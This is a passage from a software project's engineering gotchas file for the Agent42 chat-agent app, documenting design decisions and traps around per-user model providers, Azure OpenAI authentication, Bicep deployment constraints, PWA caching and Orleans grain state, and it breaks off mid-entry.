  registers `IChatClientFactory` for a grain (the four silo configurators + DevHost) must also register
  `IUserChatClientFactoryProvider` — the `SingleUserChatClientFactoryProvider` adapter is the one-line
  stand-in offline/in tests. The backend impl caches the built factory by **(userId, overlay version)**, so
  a save (which bumps the grain's version) is picked up on the next activation with no restart — full
  live-reload of active grains is out of scope.
- **Amended by ADR 0019 (2026-07-17): the `_modelId` assignment is now conditional, and the factory is
  re-resolved on the no-model path.** With the baseline chat set empty, activation can resolve a factory
  with **zero** providers (`DefaultModelId == ""`). `_modelId` is then set to `""` **regardless of a
  persisted `DeploymentName`** (`_modelId = string.IsNullOrEmpty(factory.DefaultModelId) ? "" :
  (_state.State.DeploymentName ?? factory.DefaultModelId)`), and `BuildAgent` runs against the no-op
  `NoModelChatClient` so `_agent`/`_session` stay valid. Because the factory is captured **once per
  activation**, a user who adds their first provider on an already-activated grain would keep the empty
  factory — so `_userId` is now a **retained field** and `ChatCoreAsync`/`ReceiveReminder` **re-resolve**
  `GetForUserAsync(_userId)` on the no-model path and rebind (`RebindModelAsync`) if a model became
  available. See the "Chat is fully per-user" gotcha.
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrain.cs` (`OnActivateAsync`, `UserIdFromGrainKey`),
  `src/Agent42.Agents/Models/IUserChatClientFactoryProvider.cs`,
  `src/Agent42.Backend/Models/UserChatClientFactoryProvider.cs`,
  `tests/Agent42.Tests/UserChatClientFactoryProviderTests.cs` (`VersionBump_ReturnsFreshFactory`)
- **Verified:** 2026-07-16

### Chat is fully per-user — the app ships NO baseline chat provider, and the grain stays valid via a no-op client

- **Claim:** ADR 0019 removed the baseline chat availability floor. `Models:Providers` in `appsettings.json`
  is `{}`, so the app boots with **zero** chat providers; chat is **only** the per-user overlay (ADR 0018).
  A user with none configured sees an **empty picker** and a **gated composer** (the frontend disables the
  composer **input** and shows a hint when `/api/models` is empty — ADR 0043 removed the send button that
  used to be disabled alongside it, so `input.disabled` is now the whole gate; a disabled `<textarea>` fires
  no `keydown`, which is what keeps ADR 0023's "a share prefills but cannot send" property true).
  **As of ADR 0030 there is NO fixed model left at all:** embeddings are a per-user model too (chosen
  in Preferences, resolved via `GetEmbeddingGenerator`), so the old "embedding endpoint/key is the sole remaining availability path, fatal-if-blank + `@minLength(32)`"
  claim is **dead** — the `AzureOpenAI:ApiKey`/`EmbeddingDeploymentName` fatal checks, the `@minLength` Bicep
  param, and the `AZURE_OPENAI_API_KEY` secret were all removed; the app boots with no Azure OpenAI config.
  See the "Embeddings are a per-user model" gotcha. The chat-only `AzureOpenAI:*` keys (`DeploymentName`/`SubscriptionId`/`ResourceGroup`/`AccountName`)
  and their Bicep params/env vars, plus the whole operator-level GitHub Models token wiring (a Bicep param,
  a Container App secret, and its `Models__Providers__github__ApiKey` env var), were **removed** — leaving
  that wiring in place would resurrect a broken baseline `github` provider (`ProviderKind` defaults to
  `AzureOpenAI`, so a keyed-but-
  blockless config node becomes a Foundry provider on the Azure endpoint with a GitHub PAT), re-breaking
  the empty-baseline invariant.
- **The load-bearing design: a no-op `NoModelChatClient` keeps `_agent`/`_session` valid with no model.**
  `AgentGrain.BuildAgent` only **wraps** the client — `ChatClientAgent` construction and every session
  serialize/deserialize/create op never invoke inference — so an empty
  `MultiProviderChatClientFactory` (ctor no longer throws on `providers.Count == 0`; `GetClient` returns the
  shared `NoModelChatClient`, `GetCapabilities` returns `(false,false)`, `DefaultModelId == ""`) lets the
  grain build a valid agent even with no model. **Do NOT scatter null-guards across the ~6 `_agent`/`_session`
  deref sites** (history/bind/register/reminder/rehydrate/build) — that was the rejected alternative; the
  no-op client is why they all stay non-null. Only the two sites that actually **run** the model act on the
  no-model signal (`string.IsNullOrEmpty(_chatClientFactory.DefaultModelId)`): `ChatCoreAsync` re-resolves +
  rebinds (or yields a `TextDelta` notice + `Done`, never persisted), `ReceiveReminder` re-resolves + rebinds
  (or logs + returns). A provider must declare **≥1 model** (`ValidateProvider`, 400) so "factory has
  providers ⟺ a usable default exists" — no keyed-but-modelless gap.
- **Evidence:** `src/Agent42.Backend/Models/NoModelChatClient.cs`, `src/Agent42.Backend/Models/ChatClientFactory.cs`
  (empty-tolerant ctor + `GetClient`/`GetCapabilities` guards), `src/Agent42.Agents/Conversations/AgentGrain.cs`
  (`_modelId` conditional, `ChatCoreAsync` no-model block, `RebindModelAsync`, `ReceiveReminder` guard),
  `src/Agent42.Backend/Models/UserProviderResolver.cs` (`EffectiveDefault` → first declared model → `""`),
  `src/Agent42.Backend/Models/ModelCatalog.cs` (empty-default ⇒ empty catalog), `src/Agent42.Backend/Models/AgentApi.Models.cs`
  (`ValidateProvider` ≥1-model rule), `src/Agent42.Backend/appsettings.json` (`Models:Providers: {}`),
  `src/Agent42.Backend/Program.cs` (no default derivation, no eager `GetClient(null)`), `infra/main.bicep`
  + `infra/modules/container-app.bicep` (removed chat-only params/env vars + the operator GitHub Models token wiring),
  `src/Agent42.Backend/wwwroot/js/models.js` (`applyModelAvailability`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`NoModel_YieldsNotice_AndHistoryDoesNotThrow`,
  `NoModelThenProviderAdded_ReResolvesAndReplies`, `RebindAfterRegainingModel_PreservesHistory`),
  `tests/Agent42.Tests/ProvidersApiTests.cs` (`RejectsProviderWithNoModels`),
  `.agentic/decisions/0019-remove-baseline-chat-providers.md`,
  `.agentic/decisions/0043-remove-composer-send-button.md` (the gate is `input.disabled` alone now),
  `tests/Agent42.Tests/ComposerAssetsTests.cs` (`AppJs_GatesComposerOnInputWhenNoModel`)
- **Verified:** 2026-08-21

### GitHub Models: the context-limit error is a 413, and the caps are small enough to matter here

- **Claim:** two traps, both measured against the real service. (1) A request over the model's input cap
  fails with **HTTP 413** and `{"error":{"code":"tokens_limit_reached", … "Max size: N tokens."}}` — **not**
  the 400 a context-length overflow returns on Azure OpenAI, so any handling or messaging keyed on 400/429
  sails straight past it. (2) The caps are **per request** and small: **16,000** input tokens for
  `openai/gpt-4o` / `openai/gpt-4.1`, **8,000** for the `-mini` models, **4,000** for `openai/o4-mini` —
  and enabling **pay-as-you-go billing and a budget did not lift them** (measured before and after).
  That is tight for *this* app specifically, because the session replays an 8 KB fetched page, search
  snippets and RAG excerpts on **every** turn (see "an agent tool's RETURN value is persisted"), so a
  web- or document-heavy conversation hits 413 on a GitHub model long before it would on Foundry. Also
  worth knowing when re-verifying: tool support is **per model, not per provider** (`microsoft/phi-4`
  400s on a tools request; `deepseek/DeepSeek-V3-0324` never calls one), which is why the flags are
  config, and they were measured rather than assumed. **As of ADR 0019 GitHub Models is no longer a
  baseline `appsettings` provider — it is a user-added `OpenAICompatible` provider (ADR 0018)** with the
  same per-model caps; the measured numbers below are unchanged.
- **Evidence:** `.agentic/decisions/0013-multi-provider-model-catalog.md` (spike results — the caps + the
  413 behaviour), `.agentic/decisions/0019-remove-baseline-chat-providers.md` (github is now per-user)
- **Verified:** 2026-07-14

### The Responses API is stateful by default — three non-obvious traps on the Foundry Responses path

- **Claim:** the `UseResponsesApi` Foundry path (ADR 0014) hides three traps the compiler and the method
  names do **not** make obvious. (1) **Stateless is mandatory, not a preference.** The Responses API
  stores each response server-side by default and later turns reference it by id — which would break the
  client-side-history invariant the whole grain is built on (it holds all history and replays it via
  `TryGetInMemoryChatHistory`, ADR 0004). So the build MUST use
  `AsIChatClientWithStoredOutputDisabled`, **never** the plain `AsIChatClient()` on the response client —
  the plain one silently stores and looks identical at the call site. (2) **`includeReasoningEncryptedContent`
  must be passed `false`.** The helper **defaults it `true`**, which sends
  `include:["reasoning.encrypted_content"]`; **non-reasoning models (gpt-5.4, the shipped default) reject
  that with HTTP 400** (`Encrypted content is not supported with this model`) — measured on the wire by the
  Step-1 spikes, invisible in the signature. `true` is only wanted for a *reasoning* Foundry model (to
  carry reasoning items across turns without server storage), and those are deferred. (3) **Two distinct
  experimental suppressions are needed, not one.** `GetResponsesClient()` / the
  `OpenAIClient(AuthenticationPolicy, options)` ctor are `[Experimental("OPENAI001")]`, but
  `AsIChatClientWithStoredOutputDisabled` is `[Experimental("MAAI001")]` (Microsoft.Agents.AI, a
  **different** id) — `OPENAI001` alone does not build. Scope both `#pragma`s to the branch; do not
  blanket-suppress. **Auth note (ADR 0017):** that `AuthenticationPolicy` ctor argument is now the
  `api-key`-header policy carrying the Azure OpenAI key, not the deleted managed-identity bearer bridge —
  see the "Azure's `/openai/v1` authenticates the resource key via the `api-key` header" gotcha below.
- **Evidence:** `src/Agent42.Backend/Models/ChatClientFactory.cs` (`Provider.Foundry`, the `UseResponses`
  branch), `.agentic/decisions/0014-responses-api-stateless-mode.md`, `.agentic/decisions/0017-foundry-provider-api-key-auth.md`
- **Verified:** 2026-07-16

### Azure's `/openai/v1` authenticates the resource key via the `api-key` header — three Foundry-key traps

> **Amended by ADR 0019 (2026-07-17):** the app no longer ships a baseline Foundry **chat** provider, so
> trap (2)'s "the **Foundry** key is on the availability path" narrows to "the **embedding** key is on the
> availability path" — the same `AzureOpenAI:ApiKey` now authenticates the embedding client only, still
> fatal-if-blank (Program.cs + Bicep `@minLength(32)`). Trap (3)'s shipped-`foundry`-provider details
> (`Discover:false`, declared `gpt-5.4`, `AzureOpenAI:DeploymentName`/`azureOpenAIDeploymentName`) are
> **gone with the baseline provider** — a Foundry chat model is now a per-user provider (ADR 0018), which
> declares its own deployments and its own key (no inheritance). Trap (1) (the `api-key`-header policy) is
> unchanged and still applies to any Foundry provider a user configures with Responses on.
> See the "Chat is fully per-user" gotcha.

- **Claim:** the Foundry provider authenticates with an Azure OpenAI **API key** (ADR 0017), and three
  things trip an agent that assumes otherwise. (1) **On the Responses `/openai/v1` path, use a custom
  `api-key`-header `AuthenticationPolicy`, NOT the OpenAI SDK's `ApiKeyCredential`.** `ApiKeyCredential`
  sends `Authorization: Bearer <key>` — Azure's `/openai/v1` reads the resource key from the **`api-key`
  request header**. The 2026-07-16 Step-1 spike found the correct key gets *past auth* on **both** header
  positions (a wrong key 401s on both), but `api-key` is Azure's documented mechanism, so that is what
  ships; do not "simplify" it to `ApiKeyCredential` (undocumented Bearer that could regress). **As of
  ADR 0033 the Chat Completions path uses this SAME `/openai/v1` + `api-key`-header policy** (it moved
  off `AzureOpenAIClient`'s classic api-version data plane — see the "Foundry Chat Completions runs over
  `/openai/v1`" gotcha below); only the **embedding** client still relies on
  `AzureOpenAIClient(endpoint, AzureKeyCredential)` sending `api-key` itself. (2) **The
  Foundry key is on the AVAILABILITY PATH — a blank one is FATAL, unlike a third-party provider key.**
  `ModelProviderBuilder.Build` throws when the resolved Foundry key is blank (mirrored in Bicep by a
  `@secure() @minLength(32)` param following the **`searxngSecret` shape** — unconditional secret + env +
  a `@minLength`, though `searxngSecret` itself uses 16); a *third-party* provider with no key is merely
  skipped. Resolution is `Models:Providers:<key>:ApiKey` ?? `AzureOpenAI:ApiKey`, and the embedding client
  reads the same `AzureOpenAI:ApiKey` — **one** env var (`AzureOpenAI__ApiKey`), never a second
  `Models__Providers__foundry__ApiKey`. (3) **ARM discovery is OFF for a key-based Foundry provider, and
  `gpt-4o` is not deployed.** A data-plane key can't authenticate ARM, so the shipped `foundry` provider
  sets `Discover: false` and **declares** its deployments in `appsettings`; the picker offers **exactly**
  those, and the **default deployment must be one of them** — `CompositeModelCatalog` only synthesizes the
  default when *nothing* is declared (`ModelCatalog.cs`, `if (models.Count == 0)`), so a default missing
  from a non-empty declared list silently **vanishes from the picker**. Keep `AzureOpenAI:DeploymentName`
  (Bicep `azureOpenAIDeploymentName`) in sync with the `Models` list — the same single-source trap the
  "endpoint is INHERITED" gotcha guards for `Models:Default`, now reappearing for the model *list* under
  dropped discovery. The spike found the account has **no `gpt-4o` deployment** (it has `gpt-5.4`,
  `gpt-4.1`, `gpt-5.1`, `o3`, `model-router`, `claude-*`), so the default deployment is **`gpt-5.4`**, not
  `gpt-4o` — with discovery off, a wrong default 404s every turn.
- **Evidence:** `src/Agent42.Backend/Models/ChatClientFactory.cs` (`ApiKeyHeaderPolicy`, `Provider.Foundry`),
  `src/Agent42.Backend/Models/ModelProviderBuilder.cs` (fatal-key throw), `src/Agent42.Backend/Models/ModelProviderOptions.cs`
  (`ProviderSettings.ResolveFoundry` — the dormant `AzureOpenAI:*` inheritance), `src/Agent42.Backend/appsettings.json`,
  `.agentic/decisions/0017-foundry-provider-api-key-auth.md`. (NOTE: ADR 0030 removed the eager `AzureOpenAI:ApiKey`
  check + embedding client from `Program.cs` and the `azureOpenAIApiKey` `@minLength` Bicep param — the
  `api-key`-header auth claim itself is unchanged, but those two anchors no longer exist.)
- **Verified:** 2026-07-21

### Foundry Chat Completions runs over `/openai/v1` — NOT `AzureOpenAIClient` (its api-version is capped at 2024-10-21)

- **Claim:** a Foundry provider with `UseResponsesApi` **off** (Chat Completions) must **not** be built
  through `AzureOpenAIClient.GetChatClient` — that targets the classic data plane
  `/openai/deployments/{model}/chat/completions?**api-version**=…`, and the `api-version` is supplied by
  the SDK from `AzureOpenAIClientOptions.ServiceVersion`, whose default is the **newest value the SDK
  knows**. The pinned stable **`Azure.AI.OpenAI 2.1.0` caps that enum at `V2024_10_21`** (its whole set is
  `{V2024_06_01, V2024_10_21}`) — there is nothing newer to select without a prerelease (hard-rule #4).
  Newer Foundry deployments **reject `2024-10-21` with "api version not supported"**, breaking the entire
  Chat path. The fix (ADR 0033): build the Chat path exactly like the Responses path — a stable
  `OpenAIClient` at `{endpoint}/openai/v1` (the GA "v1" surface, **no api-version**) with the
  `ApiKeyHeaderPolicy`, then `GetChatClient(model).AsIChatClient()`. **Two traps that bite:** (1) the Chat
  path shares `/openai/v1` with Responses now, so `ChatClientMetadata.ProviderUri` **cannot** discriminate
  them in a no-I/O test — the handle is instead `GetService(typeof(OpenAI.Chat.ChatClient))` (Chat) vs
  `GetService(typeof(OpenAI.Responses.ResponsesClient))` (Responses), which survives the OTel wrapper the
  factory applies. (2) the **embedding** generator is *deliberately* left on `AzureOpenAIClient`
  (`GetEmbeddingClient`), so `AzureOpenAIClient` is still built in `Provider.Foundry` — it just no longer
  serves chat; if a Foundry embedding model ever hits the same wall, give it the same `/openai/v1`
  treatment (the v1-embeddings surface was not verified in ADR 0033).
- **Evidence:** `src/Agent42.Backend/Models/ChatClientFactory.cs` (`Provider.Foundry`, the non-`UseResponses`
  branch), `tests/Agent42.Tests/ModelProviderTests.cs` (`FoundryChatProvider_UsesV1Surface_NoApiVersion`,
  `ResponsesProvider_WiresResponsesEndpoint`), `.agentic/decisions/0033-foundry-chat-over-openai-v1.md`
- **Verified:** 2026-07-25

### `HostedWebSearchTool.Name` is `web_search` — it collides with the SearXNG shim, so hosted models SWAP

- **Claim:** on the Responses path (ADR 0015) the grain does not just *add* `HostedWebSearchTool` /
  `HostedCodeInterpreterTool` alongside the existing SearXNG `web_search` / `fetch_web_page` shims — it
  **replaces** them, and that is forced, not a preference. In the agent pipeline `HostedWebSearchTool`
  surfaces under the protocol name **`web_search`** — the *same* name the shim (`AIFunctionFactory.Create(…,
  name: "web_search")`) uses — and `HostedCodeInterpreterTool` under `code_interpreter`. Registering both
  hands the model **two tools named `web_search`**. So `BuildAgent` swaps on `SupportsHostedTools`: shims
  out, hosted pair in. Two testing corollaries that bite: (a) the tool `.Name` is **not** the type name
  (`new HostedWebSearchTool().Name` reads `"web_search"`, not `"HostedWebSearchTool"`), so assert on the
  protocol names; and (b) `web_search` is ambiguous across both paths — the reliable discriminators are
  `code_interpreter` (hosted-only) and `fetch_web_page` (shim-only). (c) Absence assertions on the fake's
  echo must scope to the `[tools:…]` marker, because the `websearch` skill's description (injected into the
  system prompt) literally names `web_search`/`fetch_web_page`, so those substrings appear in the answer
  even when the tools do not.
- **Evidence:** `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs` (`BuildAgent`, the `SupportsHostedTools` swap),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`HostedToolsModel_SwapsWebShimsForHostedTools`, `ToolNames`),
  `.agentic/decisions/0015-hosted-tools-on-responses-path.md`
- **Verified:** 2026-07-15

### Cosmos containers must be pre-declared in Bicep

- **Claim:** the Cosmos account has `disableLocalAuth: true` and AAD data-plane RBAC cannot create databases/containers — only ARM can. Any new container must be added to `infra/modules/cosmos.bicep`; Orleans providers run with `IsResourceCreationEnabled = false`, so runtime auto-create silently isn't there to save you.
- **Evidence:** `infra/modules/cosmos.bicep`, `src/Agent42.Backend/Program.cs`
- **Verified:** 2026-07-06

### Cosmos account region is pinned to northeurope and immutable

- **Claim:** West Europe rejected new Cosmos accounts at creation time; the account was created in North Europe and a Cosmos account's region can't change after creation. The `cosmosLocation="northeurope"` parameter in the deploy workflow must keep matching where the account actually lives.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Custom domain must stay declared in Bicep

- **Claim:** an undeclared custom domain gets silently unbound on the next deploy. `customDomainName`/`customDomainCertificateName` must stay set, and the certificate name must match the auto-generated managed certificate — if the cert is ever recreated, update the name or the deployment unbinds the domain again.
- **Evidence:** `infra/modules/container-app.bicep`
- **Verified:** 2026-07-06

### A cross-RG role grant in RG `agent42` must be a CLI step in the deploy workflow, not Bicep

- **Claim:** the AI Foundry account lives in RG `agent42`, where the deploy SP has only `Microsoft.Authorization/roleAssignments/write` scoped to that one account — not `Microsoft.Resources/deployments/write`. A cross-RG Bicep module therefore fails; any such grant must be an idempotent `az rest` PUT in the deploy workflow, not "cleaned up" into Bicep. This is the durable constraint.
- **The specific grant the workflow still performs — "Cognitive Services OpenAI User" for the app MI — is itself NO LONGER REQUIRED (ADR 0017):** Foundry chat + embeddings authenticate by **API key**, so the app functions without any OpenAI data-plane RBAC. The `az rest` step in `deploy.yml` is now dead-but-harmless (idempotent, leaves a role that nothing reads). Keep it only as the live example of the CLI-not-Bicep pattern above; it is safe to remove.
- **Evidence:** `.github/workflows/deploy.yml` (Grant Cognitive Services OpenAI User step, ~line 113 + comment),
  `.agentic/decisions/0017-foundry-provider-api-key-auth.md` (the grant is no longer required),
  `CLAUDE.md` (the "no longer required … leaving any existing grant is harmless" note)
- **Verified:** 2026-07-16

### Deploy service principal uses a client secret, not OIDC

- **Claim:** `sp-agent42-deploy` authenticates with a client secret, so `azure/login` needs the full credentials JSON (`clientId`+`clientSecret`+…), not the OIDC client-id-only form.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Minimal-API handlers returning a bare string serve text/plain, not JSON

- **Claim:** an endpoint whose handler returns `string` (e.g. `GetSelectedModelAsync()`'s
  `Task<string>`) is written as `Content-Type: text/plain` with the raw value (`gpt-4o`),
  NOT JSON (`"gpt-4o"`). The frontend calls `response.json()` on every endpoint, which
  then throws `SyntaxError` — and because that call sat before the history render in one
  shared `try`, it silently hid the whole conversation. Wrap string results in
  `Results.Json(...)` so the API is uniformly JSON. Keep UI side-effects that can throw
  (model-picker restore) after the primary render.
- **Corollary — `Results.Json(null)` writes no body and no content-type.** Returning a
  nullable value (e.g. `Task<AgentBinding?>` from the `/agent` endpoint) through
  `Results.Json` sends an empty 200 with *no* `Content-Type` when the value is null, which
  re-trips the same `response.json()` failure. Serialize explicitly for nullable payloads:
  `Results.Text(JsonSerializer.Serialize(value, JsonSerializerOptions.Web), "application/json")`
  so an absent value comes back as a real JSON `null`.
- **Evidence:** `src/Agent42.Backend/Conversations/AgentApi.Conversations.cs` (`/model` and `/agent` endpoints), `src/Agent42.Backend/wwwroot/js/conversations.js` (`selectConversation`), `tests/Agent42.Tests/AgentApiTests.cs`
- **Verified:** 2026-07-07

### Service worker must stay network-first for navigations and bypass /api

- **Claim:** the whole app is behind Entra Easy Auth at the ingress (ADR 0002), so an
  expired session turns any navigation into a 302 redirect to the Entra login. The PWA
  service worker (`src/Agent42.Backend/wwwroot/sw.js`) is therefore **network-first for `req.mode ===
  "navigate"`** (cached `index.html` is an offline-only fallback) and **returns early for
  any `/api` path before touching the cache**. "Optimizing" the SW to cache-first
  navigations would serve a stale shell over the login redirect (auth silently breaks);
  caching `/api` would stale/leak per-user, auth-bearing, streaming chat responses. The
  `PwaAssetsTests.ServiceWorker_BypassesApiBeforeCaching` test guards the `/api` ordering,
  but the navigation strategy is only enforced here — keep it network-first.
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-06

### Offline data for agents/chats lives in an app-module IndexedDB store, NEVER in the service worker

- **Claim:** the PWA renders the user's agents and chats offline (ADR 0032) via a **client-side read
  cache in `src/Agent42.Backend/wwwroot/js/cache.js`** — a `agent42-cache` IndexedDB store (`cacheGet`/`cachePut`/`cacheDelete`) that
  mirrors `/api/agents`, `/api/conversations` and per-conversation `messages:<id>` on every successful
  fetch and is replayed on failure / at startup (`hydrateFromCache`, `renderTurns`). Do **not** "fix"
  an empty offline sidebar by caching `/api` in the service worker — that reintroduces the exact ADR
  0002 failure the SW's `/api` early-return prevents (a stale-session login 302 masked, per-user
  auth-bearing streaming responses staled/leaked) and trips
  `PwaAssetsTests.ServiceWorker_BypassesApiBeforeCaching`. The SW stays shell-only; all read caching is
  in the app modules. Two properties to keep: the cache is **best-effort** (any IndexedDB error resolves to a
  no-op — never throw into a load path), and a cache paint is **length-guarded** so the network
  fast-path is never clobbered. A chat is viewable offline only if it was opened at least once online.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/cache.js` (`cacheGet`/`cachePut`), `src/Agent42.Backend/wwwroot/js/main.js` (`hydrateFromCache`), `src/Agent42.Backend/wwwroot/js/conversations.js` (`renderTurns`), `src/Agent42.Backend/wwwroot/sw.js`, `tests/Agent42.Tests/PwaAssetsTests.cs` (`Frontend_MirrorsAgentsAndChatsForOffline`), `.agentic/decisions/0032-offline-read-cache-indexeddb.md`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-25

### A shared static instance must never be a grain-state default (Orleans mutates it)

- **Claim:** giving Orleans grain state a default that is a *cached static* instance
  (`public static T Empty { get; } = new(...)` used as `State.Prop = T.Empty`) leaks across
  grains: Orleans' generated copier/serializer writes *into* the state object it is handed, so
  every grain that started from the shared instance ends up seeing another grain's value. This
  is invisible in the code (the record is immutable-looking) and hides in single-test runs — it
  only surfaces when two grains with *different* keys are exercised in one process and one reads
  another's data. Make the default a **factory** (`public static T Empty => new(...)`, a fresh
  instance per access) or initialize the field with `new(...)` directly — never a `{ get; } =`
  singleton. Same discipline as the list defaults (`= []`) elsewhere.
- **Evidence:** `src/Agent42.Agents/Users/UserProfile.cs` (`Empty` is `=> new("")`), `src/Agent42.Agents/Users/UserProfileGrain.cs` (its UserProfileState.Profile property), `tests/Agent42.Tests/UserProfileGrainTests.cs` (`UserProfile_Empty_IsAFreshInstance_NotASharedSingleton` deterministically guards the factory property; `UserProfile_IsIsolatedPerUser` originally surfaced the leak in-cluster)
- **Verified:** 2026-07-08

### Agent Framework 1.13 session API differs from older samples

- **Claim:** it's `AgentSession` with `CreateSessionAsync` / `SerializeSessionAsync` / `DeserializeSessionAsync` — the `AgentThread` / `GetNewThread()` API from pre-1.13 samples (and model training data) no longer exists. Copy `AgentGrain.cs`, not blog posts.
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrain.cs`
- **Verified:** 2026-07-06

### Testing that a bound persona reaches the model needs the fake to echo its instructions

- **Claim:** a `ChatClientAgent` built with `ChatClientAgentOptions.ChatOptions.Instructions`
  delivers the system prompt to the *terminal* `IChatClient`, but a canned fake that only
  returns a fixed reply can't prove it arrived — a storage round-trip
  (`GetAgentBindingAsync`) proves the prompt was *saved*, not *delivered*. So `FakeChatClient`
  deliberately echoes what it receives: it prepends a `[sys:…]` marker built from the
  instructions it sees (checking `options?.Instructions` first, then any system-role
  `ChatMessage`, so the echo is robust to however AF carries them), letting a test assert the
  persona reached the model. Two traps when writing that assertion: the `AgentSkillsProvider`
  *appends* its skill catalog to the instructions, so assert the prompt is *contained*, not an
  exact match; and every chat now carries the default persona as instructions, so assert on a
  *distinctive* bound prompt, not merely on non-empty instructions.
- **Evidence:** `tests/Agent42.Tests/FakeChatClient.cs` (`InstructionsEcho`), `tests/Agent42.Tests/AgentGrainTests.cs` (`AgentChat_AppliesBoundSystemPrompt`)
- **Verified:** 2026-07-07

### Image attachment bytes must stay out of the session, and prior-turn image URLs get re-fetched

- **Claim:** the serialized `AgentSession` is written to one `agent-state` Cosmos item every
  turn, and Cosmos caps an item at **2 MB** — so attachment bytes can never be inlined
  (`DataContent`), or the first real photo blows the limit (ADR 0004). Images live in blob
  storage and reach the model as a **`UriContent` user-delegation SAS URL** (a short string).
  The non-obvious trap: a Step 1 spike proved Azure OpenAI **re-fetches a prior turn's image
  URL on every later turn**, so a short-lived SAS baked into a reopened conversation would 400.
  `AgentGrain` therefore **rehydrates before every model call** (`RehydrateAttachmentUrlsAsync`,
  from both `ChatAsync` and `ReceiveReminder`) — refreshing the SAS on every attachment
  `UriContent` in the session. Not just on activation: a warm grain serves many turns without
  reactivating, so an activation-only refresh would let a short-lived SAS lapse mid-conversation
  and 400 on the next turn. It also persists per-turn refs in `AgentGrainState.TurnAttachments`
  (one entry per user turn, in order,
  including an empty entry on the reminder path) so history joins turns to images by index.
  Don't "simplify" back to `DataContent`, and don't drop the rehydrate step. This is a prod-blob
  property the offline harness can't test (the in-memory store returns non-expiring URLs).
- **Evidence:** `src/Agent42.Agents/Attachments/AgentGrain.Attachments.cs` (`RehydrateAttachmentUrlsAsync`, `AlignTurnAttachmentsToHistory`), `src/Agent42.Agents/Conversations/AgentGrain.cs` (`ChatAsync`), `src/Agent42.Backend/Attachments/BlobAttachmentStore.cs`, `.agentic/decisions/0004-attachments-in-blob.md`
- **Verified:** 2026-07-08

### Attachments Storage RBAC is in Bicep — but only because the deploy SP was elevated once

- **Claim:** the **Storage Blob Data Contributor** grant to the container app identity
  (`infra/modules/storage-role-assignment.bicep`) is classic `Microsoft.Authorization/roleAssignments`,
  which a plain Contributor cannot create. It works in Bicep only because the deploy SP
  (`sp-agent42-deploy`) was granted **Role Based Access Control Administrator** on `rg-agent42` — a
  one-time manual elevation done 2026-07-08 (`az role assignment create … --role "Role Based Access
  Control Administrator" --scope subscriptions/<sub>/resourceGroups/rg-agent42`). If that elevation is
  removed or the SP recreated, this module's deploy fails with an authorization error — fall back to a
  manual `az role assignment create` of Storage Blob Data Contributor. This is the key difference from
  the **OpenAI grant, which stays manual** (its account is in a *different* RG where a cross-RG Bicep
  role module fails). The role also authorizes `generateUserDelegationKey`, so no account key is needed
  (shared-key auth is disabled on the account). The agent never runs role-assignment writes itself; the
  one-time elevation was run by the user.
- **Gotcha on Windows/Git Bash:** an `az … --scope "/subscriptions/…"` argument starting with `/` is
  mangled by MSYS path conversion into a Windows path → ARM returns `MissingSubscription`. Drop the
  leading `/` (`--scope "subscriptions/…"`) or prefix the command with `MSYS_NO_PATHCONV=1`.
- **Evidence:** `infra/modules/storage-role-assignment.bicep`, `infra/main.bicep` (`storageRoleAssignment` module), `infra/modules/storage.bicep`
- **Verified:** 2026-07-08

### Embeddings are a per-user model, not an operator prerequisite (ADR 0030 — supersedes the old "manual deployment" gotcha)

- **Claim:** as of **ADR 0030** the embedding model is **per-user**, not a fixed operator deployment.
  There is **no** `AzureOpenAI:EmbeddingDeploymentName`, **no** eager `AzureOpenAI:ApiKey` startup check,
  and **no** operator `IEmbeddingGenerator` singleton — all removed. A user declares an embedding model on
  a provider (the `SupportsEmbeddings` opt-in flag, like ADR 0020's image flag) and picks it as the
  **default embedding model** in Preferences (`PUT /api/default-embedding-model`); ingestion and retrieval
  resolve the generator via **`IChatClientFactory.GetEmbeddingGenerator()`** (a `Func` on `Provider`,
  mirroring `GetImageGenerationService` — **no** new provider interface, **no** new every-host registration).
  Two behaviours are load-bearing: **upload** of a document with no embedding model configured is rejected
  (composer gates it client-side; server 4xx as defense-in-depth), while **retrieval** on an existing
  document conversation with no embedding model **degrades to empty context — never throws** (guard on
  `DefaultEmbeddingModelId == ""` before embedding; `NoEmbeddingGenerator.GenerateAsync` would throw, and
  the retrieval path must not reach it — the ADR 0019 no-model-chat discipline extended to embeddings). The
  `text-embedding-3-large` deployment is still an Azure resource a user's Foundry provider points at, but it
  is **not** a repo prerequisite and needs no RBAC (API-key auth). `AzureOpenAI:Endpoint`/`ApiKey` survive
  ONLY as the **dormant** Foundry-provider inheritance source; `AzureOpenAI:TenantId` still binds
  `DefaultAzureCredential`. The `AZURE_OPENAI_API_KEY` GitHub secret + ACA secret are **removed**.
- **Evidence:** `src/Agent42.Agents/Models/IChatClientFactory.cs` (`GetEmbeddingGenerator`/`DefaultEmbeddingModelId`), `src/Agent42.Backend/Models/ChatClientFactory.cs` (Foundry/OpenAICompatible embedding funcs), `src/Agent42.Agents/Documents/NoEmbeddingGenerator.cs`, `src/Agent42.Backend/Documents/DocumentIngestionService.cs`, `src/Agent42.Agents/Documents/AgentGrain.Documents.cs` (`SearchDocumentContextAsync` empty-id guard), `src/Agent42.Backend/Models/UserProviderResolver.cs` (`EmbeddingDefaultModelId`), `.agentic/decisions/0030-user-configured-embedding-model.md`
- **Verified:** 2026-07-21

### Cosmos vector search is prod-only: capability + pre-created container + no create-on-use

- **Claim:** document retrieval (ADR 0007) needs the account-level `EnableNoSQLVectorSearch`
  capability **and** the `doc-chunks` container pre-created in Bicep with its vector policy
  (partition `/ownerKey`, vector path `/embedding` float32/cosine/3072, **`quantizedFlat`** index — a
  `flat` index caps at 505 dims and can't hold a 3072-dim embedding). **The 3072 is now load-bearing at
  ingest (ADR 0030):** the embedding model is user-chosen, so `IDocumentIndex.ExpectedDimensions`
  (`CosmosDocumentIndex` reads `Cosmos:DocChunksDimensions`, default 3072; `InMemoryDocumentIndex` → null =
